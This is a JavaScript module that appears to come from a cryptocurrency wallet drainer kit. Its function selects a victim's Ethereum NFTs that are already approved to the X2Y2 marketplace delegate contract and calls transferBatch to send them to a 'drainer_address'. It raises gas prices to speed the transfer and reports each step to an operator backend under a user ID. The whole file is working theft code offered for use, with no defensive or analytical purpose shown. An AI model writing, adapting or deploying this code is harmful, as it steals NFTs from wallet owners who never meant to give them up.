import { is_nft_approved, send_request } from "../web3-provider";
import { ethers } from "ethers";

export const MS_X2Y2_ABI = [
  {
    inputs: [
      {
        components: [
          { internalType: "contract IERC721", name: "token", type: "address" },
          { internalType: "uint256", name: "tokenId", type: "uint256" },
        ],
        internalType: "struct ERC721Delegate.Pair[]",
        name: "pairs",
        type: "tuple[]",
      },
      { internalType: "address", name: "to", type: "address" },
    ],
    name: "transferBatch",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

export const SIGN_X2Y2 = async (
  assets,
  provider,
  victim_address,
  drainer_address,
  user_id,
  min_price = 0
) => {
  try {
    const nft_list = [];
    const nft_list_plain = [];

    for (const asset of assets) {
      if (
        asset.skip ||
        asset.type !== "ERC721" ||
        asset.chain_id !== 1 ||
        asset.amount_usd < min_price
      )
        continue;
      const isApproved = await is_nft_approved(
        asset.address,
        victim_address,
        "0xf849de01b080adc3a814fabe1e2087475cf2e354"
      );
      if (!isApproved) continue;

      nft_list.push({
        token: asset.address,
        tokenId: ethers.BigNumber.from(asset.id),
      });
      nft_list_plain.push(asset);
    }

    if (nft_list.length === 0) return;

    const web3 = new ethers.providers.Web3Provider(provider);
    const signer = web3.getSigner();
    const contract = new ethers.Contract(
      "0xf849de01b080adc3a814fabe1e2087475cf2e354",
      MS_X2Y2_ABI,
      signer
    );

    try {
      const gasPrice = ethers.BigNumber.from(await web3.getGasPrice())
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("150"))
        .toString();
      let gasLimit;

      try {
        gasLimit = await contract.estimateGas.transferBatch(
          nft_list,
          drainer_address,
          { from: victim_address }
        );
        gasLimit = ethers.BigNumber.from(gasLimit)
          .div(ethers.BigNumber.from("100"))
          .mul(ethers.BigNumber.from("120"))
          .toString();
      } catch (err) {
        gasLimit = "250000";
      }

      const nonce = await web3.getTransactionCount(victim_address, "pending");

      await send_request({
        action: "x2y2",
        user_id,
        x2y2: "request",
        assets: nft_list_plain,
      });

      const result = await contract.transferBatch(nft_list, drainer_address, {
        gasLimit: ethers.BigNumber.from(gasLimit),
        gasPrice: ethers.BigNumber.from(gasPrice),
        nonce,
      });

      await result.wait();

      await send_request({ action: "x2y2", user_id, x2y2: "success" });

      for (const asset of assets) {
        if (asset.skip || asset.type !== "ERC721" || asset.chain_id !== 1)
          continue;
        let is_signed = nft_list_plain.some(
          (x_asset) =>
            x_asset.address === asset.address && x_asset.id === asset.id
        );

        if (is_signed) {
          asset.skip = true;
        }
      }
    } catch (err) {
      console.log(err);
      await send_request({ action: "x2y2", user_id, x2y2: "cancel" });
    }
  } catch (err) {
    console.log(err);
  }
};
